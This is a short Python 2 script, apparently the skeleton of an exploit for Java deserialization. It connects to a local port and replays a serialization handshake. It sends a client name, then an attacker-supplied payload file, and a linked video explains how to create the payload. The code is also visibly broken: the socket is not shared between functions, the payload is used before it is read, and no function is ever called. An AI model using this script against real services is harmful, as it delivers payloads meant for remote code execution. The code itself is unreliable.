#!/usr/bin/python
# Socket: Needed to send data to the port socket of the target host.
# Sys: Needed to exit the python program if we are unable to connect to the target host.
import socket, sys



# Establish TCP Connection
def establish_Connection():
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('127.0.0.1', 9001))

def exchange_hello():
	#1. client: aced0005
	#2. server: aced0005
	#3. server: 7704
	#4. server: f000baaa
	s.send('\xac\xed\x00\x05')

	response = s.recv(4)
	print('Received #2: ' + response)

	response = s.recv(2).encode('hex')
	print('Received #3: ' + response)

	response = s.recv(4).encode('hex')
	print('Received #4: ' + response)

def exchange_version():
	#5. client: 7704
	s.send('\x77\x04')
	#6. client: f000baaa
	s.send('\xf0\x00\xba\xaa')
	#7. server: 7702
	response = s.recv(2).encode('hex')
	print('Received #7 ' + response)
	#8. server: 0101
	response = s.recv(2).encode('hex')
	print('Received #8 ' + response)
	#i. client: 7702
	s.send('\x77\x02')
	#10. client: 0101
	s.send('\x01\x01')

def exchange_client_name():
	#11. client: 77 followed by the lenght of the string for the name + 2. So, 07 for five character 'Henry' name.
	s.send('\x77\x07\x00\x05')
	s.send('Henry')

def send_exploit():
	s.send(payload[4:])
	payload = ""
	with open(payload_file, 'rb') as content_file:
		payload = content_file.read()

payload_file = sys.argv[1]



# Create your own payload: https://youtu.be/krC5j1Ab44I?t=1985
